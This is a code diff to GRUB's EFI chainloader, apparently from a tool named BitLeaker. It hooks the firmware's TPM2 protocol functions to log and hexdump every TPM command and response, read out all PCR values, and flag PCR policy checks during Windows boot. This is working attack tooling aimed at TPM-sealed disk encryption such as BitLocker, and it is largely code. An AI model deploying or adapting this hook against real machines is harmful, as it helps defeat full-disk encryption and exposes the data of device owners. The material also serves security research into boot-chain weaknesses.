@@ -39,6 +39,9 @@
 #include <grub/macho.h>
 #include <grub/i386/macho.h>
 #endif
+#include <grub/term.h>
+#include <grub/efi/tpm.h>
+#include <grub/lib/hexdump.h>
 
 GRUB_MOD_LICENSE ("GPLv3+");
 
@@ -49,6 +52,44 @@ static grub_efi_uintn_t pages;
 static grub_efi_device_path_t *file_path;
 static grub_efi_handle_t image_handle;
 static grub_efi_char16_t *cmdline;
+
+/* Hook functions. */
+grub_efi_status_t hook_get_capability (struct grub_efi_tpm2_protocol *this,
+          EFI_TCG2_BOOT_SERVICE_CAPABILITY *ProtocolCapability);
+grub_efi_status_t hook_get_event_log (struct grub_efi_tpm2_protocol *this,
+          EFI_TCG2_EVENT_LOG_FORMAT event_log_format,
+          grub_efi_physical_address_t *event_log_location,
+          grub_efi_physical_address_t *event_log_last_entry,
+          grub_uint8_t *EventLogTruncated);
+grub_efi_status_t hook_hash_log_extend_event (struct grub_efi_tpm2_protocol *this,
+          grub_uint64_t flags,
+          grub_efi_physical_address_t data_to_hash,
+          grub_uint64_t data_to_hashlen,
+          EFI_TCG2_EVENT *efi_tcg_event);
+grub_efi_status_t hook_submit_command (struct grub_efi_tpm2_protocol *this,
+          grub_uint32_t input_parameter_block_size,
+          grub_uint8_t *input_parameter_block,
+          grub_uint32_t output_parameter_block_size,
+          grub_uint8_t *outupt_parameter_block);
+
+/* Export functions in callunwrap.S */
+grub_efi_status_t EXPORT_FUNC(efi_unwrap_2_get_capability) (struct grub_efi_tpm2_protocol *this,
+          EFI_TCG2_BOOT_SERVICE_CAPABILITY *ProtocolCapability);
+grub_efi_status_t EXPORT_FUNC(efi_unwrap_5_get_event_log) (struct grub_efi_tpm2_protocol *this,
+          EFI_TCG2_EVENT_LOG_FORMAT event_log_format,
+          grub_efi_physical_address_t *event_log_location,
+          grub_efi_physical_address_t *event_log_last_entry,
+          grub_uint8_t *EventLogTruncated);
+grub_efi_status_t EXPORT_FUNC(efi_unwrap_5_hash_log_extend_event) (struct grub_efi_tpm2_protocol *this,
+          grub_uint64_t flags,
+          grub_efi_physical_address_t data_to_hash,
+          grub_uint64_t data_to_hashlen,
+          EFI_TCG2_EVENT *efi_tcg_event);
+grub_efi_status_t EXPORT_FUNC(efi_unwrap_5_submit_command) (struct grub_efi_tpm2_protocol *this,
+          grub_uint32_t input_parameter_block_size,
+          grub_uint8_t *input_parameter_block,
+          grub_uint32_t output_parameter_block_size,
+          grub_uint8_t *outupt_parameter_block);
 
 static grub_err_t
 grub_chainloader_unload (void)
@@ -191,6 +232,160 @@ make_file_path (grub_efi_device_path_t *dp, const char *filename)
   return file_path;
 }
 
+static grub_efi_tpm2_protocol_t origin_tpm2_protocol;
+static grub_efi_uint32_t counter = 0;
+static grub_uint8_t g_output_parameter_block[1024] = {0, };
+
+static void dump_pcrs(struct grub_efi_tpm2_protocol * this)
+{
+  grub_uint8_t input_parameter_block[] = {0x80, 0x01, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00,
+    0x01, 0x7e, 0x00, 0x00, 0x00, 0x01, 0x00, 0x04, 0x03, 0x00, 0x00, 0x00};
+  grub_uint32_t input_parameter_size = sizeof(input_parameter_block);
+  grub_uint32_t output_parameter_size = sizeof(g_output_parameter_block);
+  int i;
+  int j;
+  grub_uint8_t *pcr_buffer;
+
+  grub_printf("Dump current PCRs!\n");
+
+  for(i = 0 ; i < 24 ; i++)
+  {
+      grub_memset(input_parameter_block + 17, 0, 3);
+      input_parameter_block[17 + (i / 8)] = 0x01 << (i % 8);
+
+      efi_call_5(origin_tpm2_protocol.submit_command, this, input_parameter_size,
+        input_parameter_block, output_parameter_size, g_output_parameter_block);
+
+      grub_printf("PCR [%d]: ", i);
+      pcr_buffer = (grub_uint8_t*) (g_output_parameter_block + 0x1E);
+      for(j = 0 ; j < 20 ; j++)
+      {
+        grub_printf("%02x ", pcr_buffer[j]);
+      }
+      grub_printf("\n");
+  }
+}
+grub_efi_status_t hook_get_capability (struct grub_efi_tpm2_protocol *this,
+          EFI_TCG2_BOOT_SERVICE_CAPABILITY *protocol_capability)
+{
+  grub_efi_status_t ret = 0;
+  grub_printf("[%d] tpm2_get_capability is called\n", counter++);
+  ret = efi_call_2(origin_tpm2_protocol.get_capability, this, protocol_capability);
+  grub_printf("    [*] ProtocolCapability = %p\n", protocol_capability);
+  hexdump(0, (void*)protocol_capability, sizeof(EFI_TCG2_BOOT_SERVICE_CAPABILITY));
+  dump_pcrs(this);
+  grub_getkey ();
+  return ret;
+}
+
+grub_efi_status_t hook_get_event_log (struct grub_efi_tpm2_protocol *this,
+          EFI_TCG2_EVENT_LOG_FORMAT event_log_format,
+          grub_efi_physical_address_t *event_log_location,
+          grub_efi_physical_address_t *event_log_last_entry,
+          grub_uint8_t *EventLogTruncated)
+{
+  grub_efi_status_t ret;
+  grub_printf("[%d] tpm2_get_event_log is called, Skip this...\n", counter++);
+  ret = efi_call_5(origin_tpm2_protocol.get_event_log, this, event_log_format,
+    event_log_location, event_log_last_entry, EventLogTruncated);
+  grub_getkey ();
+  return ret;
+}
+
+grub_efi_status_t hook_hash_log_extend_event (struct grub_efi_tpm2_protocol *this,
+          grub_uint64_t flags,
+          grub_efi_physical_address_t data_to_hash,
+          grub_uint64_t data_to_hashlen,
+          EFI_TCG2_EVENT *efi_tcg_event)
+{
+  grub_efi_status_t ret;
+  grub_printf("[%d] tpm2_hash_log_extend_event is called\n", counter++);
+  ret = efi_call_5(origin_tpm2_protocol.hash_log_extend_event, this, flags, data_to_hash,
+    data_to_hashlen, efi_tcg_event);
+
+  grub_printf("    [*] flags = %lx, data_to_hash = %p, Length = %ld\n",
+    flags, (void*) data_to_hash, data_to_hashlen);
+  //hexdump(0, (void*) data_to_hash, data_to_hashlen);
+
+  //grub_printf("    [*] efi_tcg_event = %p\n", efi_tcg_event);
+  //hexdump(0, (void*) efi_tcg_event, sizeof(EFI_TCG2_EVENT));
+
+  grub_getkey ();
+  return ret;
+}
+
+grub_efi_status_t hook_submit_command (struct grub_efi_tpm2_protocol *this,
+          grub_uint32_t input_parameter_block_size,
+          grub_uint8_t *input_parameter_block,
+          grub_uint32_t output_parameter_block_size,
+          grub_uint8_t *outupt_parameter_block)
+{
+  grub_efi_status_t ret;
+  grub_printf("[%d] tpm2_submit_command is called\n", counter++);
+  ret = efi_call_5(origin_tpm2_protocol.submit_command, this, input_parameter_block_size,
+    input_parameter_block, output_parameter_block_size, outupt_parameter_block);
+
+  grub_printf("    [*] InputBuffer = %p, InputSize = %d\n", input_parameter_block,
+    input_parameter_block_size);
+  hexdump(0, (void*) input_parameter_block, input_parameter_block_size);
+  grub_printf("    [*] OutputBuffer = %p, OutputSize = %d\n", outupt_parameter_block,
+    output_parameter_block_size);
+  hexdump(0, (void*) outupt_parameter_block, output_parameter_block_size);
+
+  if ((input_parameter_block[8] == 0x01) && (input_parameter_block[9] == 0x7F))
+  {
+    grub_printf("TPM2_PolicyPCR is detected\n");
+    dump_pcrs(this);
+  }
+
+  grub_getkey ();
+  return ret;
+}
+
+/*
+ * Hook the TPM pointer of UEFI service.
+ */
+static void grub_hook_tpm_ptr(void)
+{
+  grub_efi_guid_t guid = EFI_TPM2_GUID;
+  grub_efi_tpm2_protocol_t *tpm;
+  grub_efi_loaded_image_t *image;
+
+  image = grub_efi_get_loaded_image (grub_efi_image_handle);
+
+  tpm = grub_efi_locate_protocol(&guid, NULL);
+  grub_printf("BitLeaker: grub_cmd_chainloader is called\n");
+  grub_printf("Parent Hande = %p\n", image->parent_handle);
+  grub_printf("load_options = %p\n", image->load_options);
+  grub_printf("load_options = %s\n", (char*)image->load_options);
+  grub_printf("load_options_size = %d\n", image->load_options_size);
+
+  grub_printf("TPM2 service ptr = %p\n", tpm);
+  grub_printf("get_capability = %p\n", tpm->get_capability);
+  grub_printf("get_active_pcr_blanks = %p\n", tpm->get_active_pcr_blanks);
+  grub_printf("get_event_log = %p\n", tpm->get_event_log);
+  grub_printf("get_result_of_set_active_pcr_banks = %p\n", tpm->get_result_of_set_active_pcr_banks);
+  grub_printf("hash_log_extend_event = %p\n", tpm->hash_log_extend_event);
+  grub_printf("submit_command = %p\n", tpm->submit_command);
+  grub_printf("Hook start!\n");
+
+  grub_memcpy(&origin_tpm2_protocol, tpm, sizeof(origin_tpm2_protocol));
+
+  /* Hook functions! */
+  tpm->get_capability = efi_unwrap_2_get_capability;
+  tpm->get_event_log = (void*)efi_unwrap_5_get_event_log;
+  tpm->hash_log_extend_event = efi_unwrap_5_hash_log_extend_event;
+  tpm->submit_command = efi_unwrap_5_submit_command;
+
+  grub_printf("get_capability = 0x%p\n", tpm->get_capability);
+  grub_printf("get_event_log = 0x%p\n", tpm->get_event_log);
+  grub_printf("hash_log_extend_event = 0x%p\n", tpm->hash_log_extend_event);
+  grub_printf("submit_command = 0x%p\n", tpm->submit_command);
+  grub_printf("Hook complete!\n");
+
+  grub_getkey ();
+}
+
 static grub_err_t
 grub_cmd_chainloader (grub_command_t cmd __attribute__ ((unused)),
 		      int argc, char *argv[])
@@ -209,6 +404,9 @@ grub_cmd_chainloader (grub_command_t cmd __attribute__ ((unused)),
   if (argc == 0)
     return grub_error (GRUB_ERR_BAD_ARGUMENT, N_("filename expected"));
   filename = argv[0];
+
+  /* Hook the TPM pointer. */
+  grub_hook_tpm_ptr();
 
   grub_dl_ref (my_mod);
 
